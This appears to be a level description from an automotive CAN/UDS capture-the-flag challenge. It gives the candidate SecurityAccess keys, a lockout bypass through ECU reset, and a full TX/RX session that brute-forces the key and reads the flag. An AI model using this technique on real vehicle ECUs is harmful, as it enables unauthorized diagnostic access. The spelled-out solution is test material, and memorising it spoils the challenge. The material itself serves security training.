## Level 5
This level requires the user to unlock Security Access using seed 0x01 before the DiagnosticSession can be started, and 
the flag can be retrieved using ReadDataByIdentifier. The previous SecurityAccess level used a hardcoded key, this level
picks a random key from the following list:
```go
			{0x1, 0x1, 0x0, 0x0},
			{0x0, 0x0, 0x1, 0x1},
			{0x0, 0x1, 0x1, 0x0},
			{0x1, 0x0, 0x0, 0x1},
			{0x1, 0x0, 0x1, 0x0},
			{0x1, 0x1, 0x2, 0x2},
			{0x2, 0x1, 0x2, 0x1},
			{0x2, 0x3, 0x2, 0x3},
```

After 3 bad attempts the server will lock, preventing further guesses. The user can get around the lock by requesting
an EcuReset (0x11) and continue guessing until they receive a positive response. Unlock again allows the user to access
DiagnosticSession 0x02 and ReadDataIdentifier the flag 0x1337.

Example session
```shell
# read data by identifier 0xf190 (VIN)
TX: 22 f190
# read data by identifier - Positive Response
RX: 62 f190415452454449533133337

# read data by identifier 0x1337 (Flag)
TX: 22 1337
# read data by identifier - Negative Response - Conditions Not Correct
RX: 7f 2222

# securityAccess seed request (0x01)
TX: 27 01
# securityAccess seed request - Positive Response - 014141414141
RX: 67 014141414141

#Security Access Auth attempt with 0x01 0x01 0x00 0x00 - Invalid Key Response
TX: 27 0201010000
RX: 7f 2735

#Security Access Auth attempt with 0x01 0x01 0x00 0x00 - Invalid Key Response
TX: 27 0201010000
RX: 7f 2735

#Security Access Auth attempt with 0x01 0x01 0x00 0x00 - Invalid Key Response
TX: 27 0201010000
RX: 7f 2735

#Security Access Auth attempt with 0x01 0x01 0x00 0x00 - exceededNumberOfAttempts Response
TX: 27 0201010000
RX: 7f 2736

#Security Access Auth attempt with 0x01 0x01 0x00 0x00 - exceededNumberOfAttempts Response
TX: 27 0201010000
RX: 7f 2736

#ECUReset Request - Positive response
TX: 11 01
RX: 51 01

#Request SecurityAccess Seed (0x01)
TX: 27 01
# securityAccess seed request - Positive Response - 014141414141
RX: 67 014141414141

#Security Access Auth attempt with 0x01 0x01 0x00 0x00 - Invalid Key Response
TX: 27 0201010000
RX: 7f 2735

#Security Access Auth attempt with 0x01 0x01 0x00 0x00 - Positive Response
TX: 27 0201010000
RX: 67 02

#Diagnostic Session 0x02 start - Positive Response
TX: 10 02
RX: 50 02

#Successful Flag Read
TX: 22 1337
RX: 62 13376469642d796f752d7475726e2d69742d6f6e2d616e642d6f66662d616761696e
```